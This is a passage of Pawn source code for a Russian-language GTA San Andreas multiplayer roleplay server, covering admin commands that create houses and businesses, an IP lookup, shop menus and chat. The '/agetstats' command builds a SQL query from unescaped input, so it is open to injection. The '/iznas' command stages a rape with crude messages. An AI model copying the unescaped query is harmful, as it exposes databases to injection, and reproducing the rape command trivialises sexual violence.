		SCM(playerid,-1,"0 - [Nope] | 1 - [D] | 2 - [C] | 3 - [B] | 4 - [A]");
		return true;
	}
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY, 256, "INSERT INTO `house` (`hEntrancex`, `hEntrancey`,`hEntrancez`, `hLock`,`hKlass`) VALUES ('%f', '%f', '%f', '1','%i')",posX,posY,posZ,params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalHouse++;
	HouseInfo[TotalHouse][hID] = TotalHouse;
	HouseInfo[TotalHouse][hEntrancex] = posX;
	HouseInfo[TotalHouse][hEntrancey] = posY;
	HouseInfo[TotalHouse][hEntrancez] = posZ;
	HouseInfo[TotalHouse][hLock] = 1;
	HouseInfo[TotalHouse][hKlass] = params[0];
	HouseInfo[TotalHouse][hValue] = params[1];
	if(HouseInfo[TotalHouse][hKlass] == 0)
	{
		HouseInfo[TotalHouse][hInt] = 10;
		HouseInfo[TotalHouse][hExitx] = 421.7613;
		HouseInfo[TotalHouse][hExity] = 2536.4836;
		HouseInfo[TotalHouse][hExitz] = 10.0000;
	}
	else if(HouseInfo[TotalHouse][hKlass] == 1)
	{
		HouseInfo[TotalHouse][hInt] = 6;
		HouseInfo[TotalHouse][hExitx] = -68.8618;
		HouseInfo[TotalHouse][hExity] = 1352.2183;
		HouseInfo[TotalHouse][hExitz] = 1080.2109;
	}
	else if(HouseInfo[TotalHouse][hKlass] == 2)
	{
		HouseInfo[TotalHouse][hInt] = 5;
		HouseInfo[TotalHouse][hExitx] = 22.7405;
		HouseInfo[TotalHouse][hExity] = 1404.3799;
		HouseInfo[TotalHouse][hExitz] = 1084.4297;
	}
	else if(HouseInfo[TotalHouse][hKlass] == 3)
	{
		HouseInfo[TotalHouse][hInt] = 12;
		HouseInfo[TotalHouse][hExitx] = 2324.3367;
		HouseInfo[TotalHouse][hExity] = -1148.6296;
		HouseInfo[TotalHouse][hExitz] = 1050.7101;
	}
	else
	{
		HouseInfo[TotalHouse][hInt] = 5;
		HouseInfo[TotalHouse][hExitx] = 140.2206;
		HouseInfo[TotalHouse][hExity] = 1367.2734;
		HouseInfo[TotalHouse][hExitz] = 1083.8612;
	}
	HouseInfo[TotalHouse][hPickup] = CreatePickup(1273, 23, HouseInfo[TotalHouse][hEntrancex], HouseInfo[TotalHouse][hEntrancey], HouseInfo[TotalHouse][hEntrancez],-1);
	HouseInfo[TotalHouse][hMIcon] = CreateDynamicMapIcon(HouseInfo[TotalHouse][hEntrancex], HouseInfo[TotalHouse][hEntrancey], HouseInfo[TotalHouse][hEntrancez], 31, -1, 0, -1, -1,150);
	SCM(playerid,-1," Вы создали дом. Используйте /sethousecarpos (Указать позицию авто)");
	BuyHouse(TotalHouse);
	return true;
}
CMD:addcbar(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addcbar [цена] [название]");
	mysql_format(DATABASE,QUERY, 256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`,`bBarX`,`bBarY`,`bBarZ`) VALUES ('1903.6458', '964.9723', '10.8203', '1','0', '1946.2197','1017.7030','992.4688')");
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = 1903.6458;
	BizzInfo[TotalBizz][bEntranceY] = 964.9723;
	BizzInfo[TotalBizz][bEntranceZ] = 10.8203;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 5;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	SCM(playerid,-1," Вы создали бар для казино Four Dragons");
	return true;
}
CMD:addsbizz(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addsbizz [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY, 256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 4;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	SCM(playerid,-1," Вы создали заправку..");
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage],BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	return true;
}
CMD:addeat(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addeat [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY,256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bVirtualWorld] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 2;
	BizzInfo[TotalBizz][bInterior] = 10;
	BizzInfo[TotalBizz][bExitX] = 362.919;
	BizzInfo[TotalBizz][bExitY] = -75.207;
	BizzInfo[TotalBizz][bExitZ] = 1001.51;
	BizzInfo[TotalBizz][bBarX] = 377.075;
	BizzInfo[TotalBizz][bBarY] = -67.4374;
	BizzInfo[TotalBizz][bBarZ] = 1001.51;
	BizzInfo[TotalBizz][bPrice] = 0;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	BizzInfo[TotalBizz][bEnterPic] = CreatePickup(1318, 23, BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],-1);
	BizzInfo[TotalBizz][bExitPic] = CreatePickup(1318, 23, BizzInfo[TotalBizz][bExitX], BizzInfo[TotalBizz][bExitY], BizzInfo[TotalBizz][bExitZ],BizzInfo[TotalBizz][bVirtualWorld]);
	PickupX[playerid] = BizzInfo[TotalBizz][bEntranceX], PickupY[playerid] = BizzInfo[TotalBizz][bEntranceY];
	oldpickup[playerid] = BizzInfo[TotalBizz][bEnterPic];
	timepickup[playerid] = 3;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage], BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	SCM(playerid,-1," Вы создали закусочную");
	return true;
}
CMD:addpizza(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addpizza [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY,256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bVirtualWorld] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 2;
	BizzInfo[TotalBizz][bInterior] = 5;
	BizzInfo[TotalBizz][bExitX] = 372.36;
	BizzInfo[TotalBizz][bExitY] = -133.521;
	BizzInfo[TotalBizz][bExitZ] = 1001.49;
	BizzInfo[TotalBizz][bBarX] = 375.888;
	BizzInfo[TotalBizz][bBarY] = -118.817;
	BizzInfo[TotalBizz][bBarZ] = 1001.5;
	BizzInfo[TotalBizz][bPrice] = 0;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	BizzInfo[TotalBizz][bEnterPic] = CreatePickup(1318, 23, BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],-1);
	BizzInfo[TotalBizz][bExitPic] = CreatePickup(1318, 23, BizzInfo[TotalBizz][bExitX], BizzInfo[TotalBizz][bExitY], BizzInfo[TotalBizz][bExitZ],BizzInfo[TotalBizz][bVirtualWorld]);
	PickupX[playerid] = BizzInfo[TotalBizz][bEntranceX], PickupY[playerid] = BizzInfo[TotalBizz][bEntranceY];
	oldpickup[playerid] = BizzInfo[TotalBizz][bEnterPic];
	timepickup[playerid] = 3;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage], BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	SCM(playerid,-1," Вы создали пиццерию");
	return true;
}
CMD:addshop(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 8 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ds[64]",params[0],params[1])) return SCM(playerid, -1, " Введите: /addshop [цена] [название]");
	new Float: posX, Float: posY, Float: posZ;
	GetPlayerPos(playerid, posX, posY, posZ);
	mysql_format(DATABASE,QUERY,256, "INSERT INTO `bizz` (`bEntranceX`, `bEntranceY`,`bEntranceZ`, `bLocked`,`bMafia`) VALUES ('%f', '%f', '%f', '1','0')",posX,posY,posZ);
	mysql_function_query(DATABASE,QUERY,false,"","");
	TotalBizz++;
	BizzInfo[TotalBizz][bID] = TotalBizz;
	BizzInfo[TotalBizz][bVirtualWorld] = TotalBizz;
	BizzInfo[TotalBizz][bEntranceX] = posX;
	BizzInfo[TotalBizz][bEntranceY] = posY;
	BizzInfo[TotalBizz][bEntranceZ] = posZ;
	BizzInfo[TotalBizz][bLocked] = 1;
	BizzInfo[TotalBizz][bBuyPrice] = params[0];
	BizzInfo[TotalBizz][bType] = 3;
	BizzInfo[TotalBizz][bInterior] = 6;
	BizzInfo[TotalBizz][bExitX] = -2240.4685;
	BizzInfo[TotalBizz][bExitY] = 137.0604;
	BizzInfo[TotalBizz][bExitZ] = 1035.4140;
	BizzInfo[TotalBizz][bBarX] = -2236.1130;
	BizzInfo[TotalBizz][bBarY] = 130.1580;
	BizzInfo[TotalBizz][bBarZ] = 1035.4141;
	BizzInfo[TotalBizz][bPrice] = 0;
	strmid(BizzInfo[TotalBizz][bMessage],params[1], 0, strlen(params[1]), 64);
	strmid(BizzInfo[TotalBizz][bNameStavka],"-", 0, strlen("-"), 64);
	BizzInfo[TotalBizz][bEnterPic] = CreatePickup(1318, 23, BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],-1);
	BizzInfo[TotalBizz][bExitPic] = CreatePickup(1318, 23, BizzInfo[TotalBizz][bExitX], BizzInfo[TotalBizz][bExitY], BizzInfo[TotalBizz][bExitZ],BizzInfo[TotalBizz][bVirtualWorld]);
	PickupX[playerid] = BizzInfo[TotalBizz][bEntranceX], PickupY[playerid] = BizzInfo[TotalBizz][bEntranceY];
	oldpickup[playerid] = BizzInfo[TotalBizz][bEnterPic];
	timepickup[playerid] = 3;
	format(YCMDstr, sizeof(YCMDstr), "%s\nПродаётся", BizzInfo[TotalBizz][bMessage], BizzInfo[TotalBizz][bBuyPrice]);
	BizzInfo[TotalBizz][bLabel] = CreateDynamic3DTextLabel(YCMDstr, COLOR_GREEN,BizzInfo[TotalBizz][bEntranceX], BizzInfo[TotalBizz][bEntranceY], BizzInfo[TotalBizz][bEntranceZ],20.0);
	SCM(playerid,-1," Вы создали 24-7.");
	return true;
}
CMD:getip(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid,-1, " Введите: /getip [id/ник]");
	new ip[15];
	GetPlayerIp(params[0],ip,15);
	format(YCMDstr, sizeof(YCMDstr), " Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PTEMP[params[0]][pIpReg],PTEMP[params[0]][pvIp],ip);
	SCM(playerid,COLOR_BLUE,YCMDstr);
	return true;
}
CMD:getstats(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /getstats [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PTEMP[playerid][pAdmin] > 1 && PTEMP[playerid][pAdmin] < 2) return ShowStats(playerid,params[0]);
	if(PTEMP[playerid][pAdmin] > 3) return kShowStats(playerid,params[0]);
	return true;
}
CMD:stats(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	ShowStats(playerid, playerid);
	return true;
}
CMD:myhhouse(playerid, params[])
{
	format(YCMDstr, sizeof(YCMDstr), " my house: %d",PTEMP[playerid][pPHouseKey]);
	SCM(playerid,COLOR_BLUE,YCMDstr);
	return true;
}
CMD:fractionid(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if (PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	LeaderList(playerid);
	return true;
}
CMD:iwep(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	new giveplayerid;
	if(sscanf(params, "u",giveplayerid)) return  	SCM(playerid, -1, " Введите: /iwep [playerid]");
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			new Gun[13], Ammo[13], wep[450];
			GetPlayerWeaponData(giveplayerid,0,Gun[0],Ammo[0]);
			GetPlayerWeaponData(giveplayerid,1,Gun[1],Ammo[1]);
			GetPlayerWeaponData(giveplayerid,2,Gun[2],Ammo[2]);
			GetPlayerWeaponData(giveplayerid,3,Gun[3],Ammo[3]);
			GetPlayerWeaponData(giveplayerid,4,Gun[4],Ammo[4]);
			GetPlayerWeaponData(giveplayerid,5,Gun[5],Ammo[5]);
			GetPlayerWeaponData(giveplayerid,6,Gun[6],Ammo[6]);
			GetPlayerWeaponData(giveplayerid,7,Gun[7],Ammo[7]);
			GetPlayerWeaponData(giveplayerid,8,Gun[8],Ammo[8]);
			GetPlayerWeaponData(giveplayerid,9,Gun[9],Ammo[9]);
			GetPlayerWeaponData(giveplayerid,10,Gun[10],Ammo[10]);
			GetPlayerWeaponData(giveplayerid,11,Gun[11],Ammo[11]);
			GetPlayerWeaponData(giveplayerid,12,Gun[12],Ammo[12]);
			format(wep,sizeof(wep),
			"{ff00ff}State:   %s\n\n\
			0: Ид оружия: %i    Патрон: %i\
			\n1: Ид оружия: %i    Патрон: %i\
			\n2: Ид оружия: %i    Патрон: %i\
			\n3: Ид оружия: %i    Патрон: %i\
			\n4: Ид оружия: %i    Патрон: %i\
			\n5: Ид оружия: %i    Патрон: %i\
			\n6: Ид оружия: %i    Патрон: %i\
			\n7: Ид оружия: %i    Патрон: %i\
			\n8: Ид оружия: %i    Патрон: %i\
			\n9: Ид оружия: %i    Патрон: %i\
			\n10: Ид оружия: %i    Патрон: %i\
			\n11: Ид оружия: %i    Патрон: %i\
			\n12: Ид оружия: %i    Патрон: %i"
			, PTEMP[giveplayerid][pName], Gun[0], Ammo[0], Gun[1], Ammo[1], Gun[2], Ammo[2], Gun[3], Ammo[3], Gun[4], Ammo[4], Gun[5], Ammo[5], Gun[6], Ammo[6], Gun[7], Ammo[7], Gun[8], Ammo[8], Gun[9], Ammo[9], Gun[10], Ammo[10], Gun[11], Ammo[11], Gun[12], Ammo[12]);
			ShowPlayerDialogEx(playerid,999,DIALOG_STYLE_MSGBOX,"Информация оружия",wep,"Закрыть","");
		}
	}
	else return SCM(playerid, COLOR_GREY, " Игрок не найден!");
	return true;
}
CMD:agetstats(playerid, params[])
{
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new name[64];
	if(sscanf(params, "s[64]", name)) return SCM(playerid, -1, " Введите: /agetstats [ник игрока]");
	mysql_format(DATABASE,QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%s'",name);
	mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",16,playerid,name);
	return true;
}
CMD:number(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /number [id]");
	if(!IsPlayerConnected(params[0])) return true;
	format(YCMDstr, 256, " Имя: %s, телефон: %i",Name(params[0]),PTEMP[params[0]][pPnumber]);
	SCM(playerid, -1, YCMDstr);
	return true;
}
CMD:bizfee(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	if(!BGet(playerid)) return SCM(playerid, COLOR_GRAD2, "У вас нет бизнеса!");
	new bouse = PTEMP[playerid][pPBizzKey];
	if(sscanf(params, "d",params[0])) return 	SCM(playerid, -1, " Введите: /bizfee [цена]");
	if(params[0] < 50 || params[0] > 5000) return SCM(playerid, COLOR_GREY, " Минимальная цена 50, Максимальная 5000 вирт");
	BizzInfo[bouse][bPrice] = params[0];
	format(YCMDstr, sizeof(YCMDstr), " Цена за товар установлена на %i вирт", BizzInfo[bouse][bPrice]);
	SCM(playerid, -1, YCMDstr);
	if(BizzInfo[bouse][bType] == 4)
	{
		format(string,128, "%s\nВладелец:\n%s\nЦена бензина: %i вирт", BizzInfo[bouse][bMessage], BizzInfo[bouse][bOwner],BizzInfo[bouse][bPrice]);
		UpdateDynamic3DTextLabelText(BizzInfo[bouse][bLabel], COLOR_GREEN, string);
	}
	return true;
}
CMD:eat(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new h = 1; h <= TotalBizz; h++)
	{
		if(!PlayerToPoint(10, playerid,BizzInfo[h][bBarX], BizzInfo[h][bBarY], BizzInfo[h][bBarZ]) || BizzInfo[h][bType] != 2 || GetPlayerVirtualWorld(playerid) != BizzInfo[h][bVirtualWorld]) continue;
		if(strcmp(BizzInfo[h][bOwner],"None",true) == 0 || BizzInfo[h][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
		if(GetPlayerInterior(playerid) == 10 || GetPlayerInterior(playerid) == 4) format(YCMDstr,sizeof(YCMDstr), "Бургер\t\t\t\t[%i вирт]\nРыбный суп\t\t\t[%i вирт]\nБольшой бургер\t\t[%i вирт]\nКотлеты\t\t\t[%i вирт]\
		\nПельмени\t\t\t[%i вирт]\nГамбургер\t\t\t[%i вирт]",BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3);
		else format(YCMDstr,sizeof(YCMDstr), "Пицца маленькая\t\t[%i вирт]\nПицца с грибами\t\t[%i вирт]\nПицца с сыром\t\t[%i вирт]\nПицца большая\t\t[%i вирт]\
		\nПицца с ветчиной\t\t[%i вирт]\nПицца с куринным мясом\t[%i вирт]",BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3);
		ShowPlayerDialogEx(playerid, 3389, DIALOG_STYLE_LIST, "Меню", YCMDstr, "Выбрать", "Отмена");
	}
	return true;
}
CMD:buy(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(!PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) || BizzInfo[i][bType] != 3 || GetPlayerVirtualWorld(playerid) != BizzInfo[i][bVirtualWorld]) continue;
		if(strcmp(BizzInfo[i][bOwner],"None",true) == 0 || BizzInfo[i][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
		if(BizzInfo[i][bProducts] <= 0) return SCM(playerid,COLOR_GREY," В бизнесе нет продуктов"), BizzInfo[i][bProducts] = 0;
		format(string,300,"Номер телефона:\t[%i вирт]\nСправочник:\t\t[%i вирт]\nАптечки(25шт.):\t\t[%i вирт]\nФотоаппарат:\t\t[%i вирт]\nЦветы:\t\t\t[%i вирт]\nУдочка:\t\t[%i вирт]\nСнасти(10шт.):\t\t[%i вирт]\nСонар:\t\t\t[%i вирт]",BizzInfo[i][bPrice],BizzInfo[i][bPrice]*2,
		BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*4,BizzInfo[i][bPrice]*4,BizzInfo[i][bPrice]*5);
		ShowPlayerDialogEx(playerid, 5589, DIALOG_STYLE_LIST, "24/7", string, "Купить", "Отмена");
	}
	return true;
}
CMD:drink(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(!IsPlayerConnected(playerid)) return true;
	for(new i = 1; i <= TotalBizz; i++)
	{
		if(!PlayerToPoint(10, playerid,BizzInfo[i][bBarX], BizzInfo[i][bBarY], BizzInfo[i][bBarZ]) || BizzInfo[i][bType] != 1 || GetPlayerVirtualWorld(playerid) != BizzInfo[i][bVirtualWorld]) continue;
		if(strcmp(BizzInfo[i][bOwner],"None",true) == 0 || BizzInfo[i][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
		format(YCMDstr,sizeof(YCMDstr), "Вода\t\t[%i вирт]\nСода\t\t[%i вирт]\nТоник\t\t[%i вирт]\nКока-кола\t[%i вирт]\nПиво\t\t[%i вирт]\nСаке\t\t[%i вирт]\nВодка\t\t[%i вирт]\nВино\t\t[%i вирт]\nВиски\t\t[%i вирт]\nКоньяк\t\t[%i вирт]\nАбсент\t\t[%i вирт]",
		BizzInfo[i][bPrice],BizzInfo[i][bPrice],BizzInfo[i][bPrice],BizzInfo[i][bPrice]*2,BizzInfo[i][bPrice]*2,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*3,BizzInfo[i][bPrice]*4,BizzInfo[i][bPrice]*5,BizzInfo[i][bPrice]*5,BizzInfo[i][bPrice]*6);
		ShowPlayerDialogEx(playerid, 2289, DIALOG_STYLE_LIST, "Меню Бара", YCMDstr, "Выбрать", "Отмена");
	}
	return true;
}
CMD:gps(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(CP[playerid] == 776) { DisablePlayerCheckpoint(playerid), CP[playerid] = 0; }
	ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Назад");
	return true;
}
CMD:setsex(playerid)
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pSex] == 0)
	{
	    PTEMP[playerid][pSex] = 1;
	    SCM(playerid, 0x6495edff, " Вы сменили пол на мужской");
	}
	else
	{
		PTEMP[playerid][pSex] = 0;
	    SCM(playerid, 0x6495edff, " Вы сменили пол на женский");
	}
	return true;
}
CMD:iznas(playerid, params[])
{
    if(PTEMP[playerid][pLogin] == 0) return true;
    if(Flood[playerid] > 0)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
  		if(GetPVarInt(playerid,"Flood") >= 5) kick(playerid);
  		SendClientMessage(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
    if(PTEMP[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	new Float:health;
	GetPlayerHealth(playerid, health);
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, " Нельзя использовать в машине");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, -1, " Введите: /iznas [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(!ProxDetectorS(8.0, playerid, params[0])) return true;
	if(params[0] == playerid) return SendClientMessage(playerid,COLOR_GREY, " [Ошибка] Вы указали свой ID");
	if(PTEMP[playerid][pHP] < 25) return SendClientMessage(playerid,COLOR_GREY, " У жертвы болит анус! Его нельзя насиловать!");
	if(PTEMP[params[0]][pAdmin] > PTEMP[playerid][pAdmin]) return SendClientMessage(playerid,COLOR_GREY, " Его нельзя");
	new Float:angle;
	SetPlayerHealthAC(playerid, health - 25.0);
	PTEMP[playerid][pHP] -= 25;
	GetPlayerFacingAngle(playerid, angle);
	SetPlayerFacingAngle(params[0], angle + 180);
	SendClientMessage(playerid, 0x00AB06AA, " Вы изнасиловали прохожего. Жертва сильно ударила вас {FFFFFF}(( - 25 хп ))");
	SendClientMessage(params[0], 0xC42100AA, " Вас изнасиловал маньяк");
	format(YCMDstr, sizeof(YCMDstr), " %s изнасиловал(а) %s",Name(playerid) ,Name(params[0]));
	ProxDetector(10.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	ApplyAnimation(params[0], "SNM", "SPANKINGW",4.1,0,1,1,1,1,1);
	ApplyAnimation(playerid, "SNM", "SPANKEDW",4.1,0,1,1,1,1,1);
	Flood[playerid] = 2;
	SetPVarInt(playerid,"Flood",0);
	PTEMP[playerid][pWantedLevel]++;
	SetPlayerWantedLevel(playerid,PTEMP[playerid][pWantedLevel]);
	SetPlayerCriminal(playerid,"Неизвестный", "Изнасилование");
	return true;
}
CMD:ooc(playerid, params[])
{
    if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pMuted] > 0)
	{
		format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
		SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
		return true;
	}
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: (/o)oc [текст]");
	if((!noooc) && PTEMP[playerid][pAdmin] < 1) return SCM(playerid, COLOR_GRAD1, " Общий чат отключен админом!");
	else if(dostup[playerid] == 0 && PTEMP[playerid][pAdmin] >= 1) return true;
	if(PTEMP[playerid][pAdmin] == 0 && gettime() < antioocsend) return SCM(playerid, COLOR_GREY, " Антифлуд ooc чата");
	antioocsend = gettime()+antiooc;
	foreach(i)
	{
		if(ChatOOC[playerid] == 1) SendMes(i,COLOR_OOC," << %s[%i]: %s >>",PTEMP[playerid][pName], playerid, params[0]);
	}
	return 1;
}
CMD:olimit(playerid, params[])
{
	if(PTEMP[playerid][pLogin] == 0) return true;
	if(PTEMP[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",antiooc)) return SCM(playerid, -1, " Введите: /olimit [секунд 0 - 10]");
	if(antiooc > 10 || antiooc < 0) return SCM(playerid, COLOR_GREY, " Не меньше 0 и не больше 10 сек");
//	if(antiooc < 0) return SCM(playerid, COLOR_GREY, " Не меньше 0 сек");
	SendMes(playerid,-1," Установлен лимит ooc чата %i секунд",antiooc);
	return 1;
}
CMD:noooc(playerid, params[])
{
	if(!PTEMP[playerid][pLogin]) return true;
